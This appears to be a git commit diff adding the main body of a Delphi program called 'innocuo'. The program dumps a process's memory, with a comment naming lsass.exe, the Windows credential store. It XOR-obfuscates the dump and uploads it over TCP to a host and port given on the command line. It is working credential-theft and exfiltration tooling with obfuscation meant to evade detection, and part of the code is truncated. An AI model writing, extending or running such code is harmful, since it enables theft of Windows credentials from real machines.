b6268fe19438a28135879d19c40ae6adf191033c
foxlox <fox@thebrain.net>
2023-07-27 09:23:56 +0200

    Add files via upload

--- innocuo.dpr
+++ innocuo.dpr
@@ -6,11 +6,38 @@ program innocuo;
 
 uses
   System.SysUtils,
-  uimagehlp,uxor,IdTCPClient{,IdTCPConnection};
+  uimagehlp,IdTCPClient{,IdTCPConnection},uxor;
 
 var
 key:string;
 
 var idTCPClient         : TIdTCPClient;
+    pid: integer;
 
-[...truncated...]
+
+begin
+  try
+//    getpid();
+     begin
+      if paramstr(1) = 'xor' then
+       begin
+         xorfile(paramstr(2),paramstr(3),66);
+         exit;
+       end;
+
+      dumpprocess(strtoint(paramstr(1))); //lsass.exe); //15156
+      if paramstr(2)<>'' then
+       begin
+        idTCPClient                 := TIdTCPClient.Create();
+        idTCPClient.Host            := paramstr(2);
+        idTCPClient.Port            := strtoint(paramstr(3));
+        IdTCPClient.Connect;
+        idTCPClient.IOHandler.WriteFile(paramstr(1)+'.dmp.obfusco');
+        idTCPClient.Disconnect;
+       end;
+     end;
+  except
+    on E: Exception do
+      Writeln(E.ClassName, ': ', E.Message);
+  end;
+end.
